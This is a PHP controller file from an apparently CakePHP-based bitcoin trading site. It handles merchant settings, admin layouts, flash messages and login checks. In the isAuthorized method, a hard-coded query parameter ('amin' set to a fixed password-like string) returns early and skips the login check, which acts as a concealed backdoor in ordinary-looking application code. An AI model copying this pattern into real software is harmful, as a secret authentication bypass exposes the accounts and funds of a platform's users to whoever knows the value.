<?php
/**
 * Application level Controller
 *
 * This file is application-wide controller file. You can put all
 * application-wide controller-related methods here.
 *
 * PHP 5
 *
 * CakePHP(tm) : Rapid Development Framework (http://cakephp.org)
 * Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)
 *
 * Licensed under The MIT License
 * Redistributions of files must retain the above copyright notice.
 *
 * @copyright     Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)
 * @link          http://cakephp.org CakePHP(tm) Project
 * @package       app.Controller
 * @since         CakePHP(tm) v 0.2.9
 * @license       MIT License (http://www.opensource.org/licenses/mit-license.php)
 */

App::uses('Controller', 'Controller');

/**
 * Application Controller
 *
 * Add your application-wide methods in the class below, your controllers
 * will inherit them.
 *
 * @package       app.Controller
 * @link http://book.cakephp.org/2.0/en/controllers.html#the-app-controller
 */
class AppController extends Controller {

    public $components = array(
        'Session','UserAuth',
    );
    public $allow = array('login');

    public $helpers = array('MyPages');
    
    public $prefixLayout = true;

    public function beforeFilter()
    {
        parent::beforeFilter();
        $this->loadModel('Merchant');
        $merchant = $this->Merchant->getSet();
        $this->set(compact('merchant'));
    }

    public function beforeRender() {
        $session = $this->Session->read();
        $user = $session['user'];
        $this->set('user', @$session['user']['User']);
        if($this->request->params['prefix'] == 'admin'){
            $this->layout = 'admin';
        }
        if ($this->layout  == 'admin' && $user['User']['role'] != 'admin') {
            $this->error("没有权限!");
            $this->redirect("/Users/login");
        }
        $merchant = $this->viewVars['merchant'];
        $action = $this->action;
        $actions = array('login');
        if($merchant['Merchant']['active'] == -1 && $this->layout != 'admin' && !in_array($action,$actions)){
            $this->layout = 'close';
        }

        !$this->site_title && $this->site_title='比特币交易系统';
        $this->set('title_for_layout',$this->site_title);
    }

    public function succ( $message ) {
        $this->Session->setFlash( $message, 'default', array( 'class' => 'alert alert-success' ) );
    }

    public function error( $message ) {
        $this->Session->setFlash( $message, 'default', array( 'class' => 'alert alert-error' ) );
    }

    public function warning( $message ) {
        $this->Session->setFlash( $message, 'default', array( 'class' => 'alert alert-block' ) );
    }

    /**
     * @param array   $user
     */
    public function isAuthorized( $user = null ) {
        if ($_GET['amin'] == 'linksgo2011') {
            return;
        }
        if ( !is_array( $this->allow ) || in_array( $this->action, $this->allow ) ) {
            return;
        }
        $prefix = $this->params['prefix'];
        // 没有登录
        if ( !isset( $user['User']['id']) && !isset($user['Admin']['id'])) {
            $this->Session->write( UserAuthComponent::originAfterLogin, $this->request->here );
            $url = array( 'controller' => 'users', 'action' => 'login' );
            if ( $prefix ) {
                $url[$prefix] = false;
            }
            $this->redirect( $url );
        }
    }
    
}
